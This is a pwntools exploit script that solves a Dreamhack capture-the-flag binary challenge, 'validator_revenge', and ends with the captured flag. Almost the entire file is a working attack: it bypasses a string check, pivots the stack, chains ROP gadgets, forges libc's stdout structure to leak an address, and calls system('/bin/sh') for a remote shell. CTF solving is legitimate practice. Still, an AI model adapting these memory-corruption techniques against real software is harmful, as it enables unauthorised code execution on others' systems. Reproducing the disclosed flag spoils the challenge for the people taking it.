from pwn import *

''' from roberuto
Thường ba cái này t quen cmnr
M éo có writable libc pointer thì pivot rồi gọi mấy hàm plt ra cho nó có pointer trên fake stack thôi
Xong r tìm gadgets add sub ptr rồi cộng trừ offset thôi
'''

exe = ELF("./validator_revenge_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
context.binary = exe

debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x4007D6
b *0x4007F6
'''

p = remote("host3.dreamhack.games", 15670)
#p = process("./validator_revenge_patched")
#p = gdb.debug("./validator_revenge_patched", gdbscript = script)

# bypass the string check
first_part = b"DREAMHACK!"
for i in range(0x80 - 10, 0, -1):
    first_part += p8(i)

pop_rdi = 0x0000000000400873
pop_rsi = 0x000000000040068b
pop_rdx = 0x0000000000400694
pop_rbp = 0x0000000000400608
leave_ret = 0x000000000040079b
main = 0x4007C5
pop_rsp_r13_r14_r15 = 0x000000000040086d
ret = leave_ret + 1
read_plt = exe.plt['read']
fflush_plt = exe.plt['fflush']

# stack pivot
payload = first_part
payload += p64(0x601800) + p64(main)
p.send(payload)
sleep(2)

# fflush again to have stdout ptr in fake stack
payload = first_part
payload += p64(0x601810) + p64(0x4007EC) # call fflush, then stdout ptr at 0x6017d8 
payload += p64(0) + p64(ret) * 31 # padding the stack so it wont destroy ptr value
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(0x6017e0)
payload += p64(pop_rdx) + p64(0x78)
payload += p64(read_plt) # input, prepare ROP chain after we get stdout value, begin from 0x6017e0
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(0x6017d0)
payload += p64(pop_rdx) + p64(0x8)
payload += p64(read_plt) # input, prepare pop_rsi right before stdout value at 0x6017d0
payload += p64(pop_rsp_r13_r14_r15) + p64(0x6017b8)
p.send(payload)
sleep(2)

# ROPchain for after get stdout value
payload = p64(pop_rdi) + p64(0)
payload += p64(pop_rdx) + p64(0x48)
payload += p64(read_plt) # input, overwrite stdout in libc
payload += p64(pop_rbp) + p64(0x601818)
payload += p64(0x4007ec) # this fflush will leak libc address
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(0x601858)
payload += p64(pop_rdx) + p64(0x20)
payload += p64(read_plt) # input, prepare ROPchain ret2libc
p.send(payload)

#debug()

# pop_rsi at 0x6017d0
payload = p64(pop_rsi)
p.send(payload)

# overwrite stdout in libc
fakestdout = p64(0x00000000fbad2887) # flag
fakestdout += p64(0) # read_ptr
fakestdout += p64(0x601020) # read_end
fakestdout += p64(0) # read_base
fakestdout += p64(0x601020) # write_base
fakestdout += p64(0x601020 + 0x100) # write_ptr
fakestdout += p64(0) # write_end
fakestdout += p64(0) # buf_base
fakestdout += p64(0x100)
p.send(fakestdout)

libc_base = u64(p.recv(8)) - libc.symbols['_IO_2_1_stdout_']

# ret2libc
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]

payload = p64(pop_rdi) + p64(binsh)
payload += p64(ret) + p64(system)
p.send(payload) 

p.interactive()
#DH{a5de2f15c3d0ed05df1bb96f835ed77f}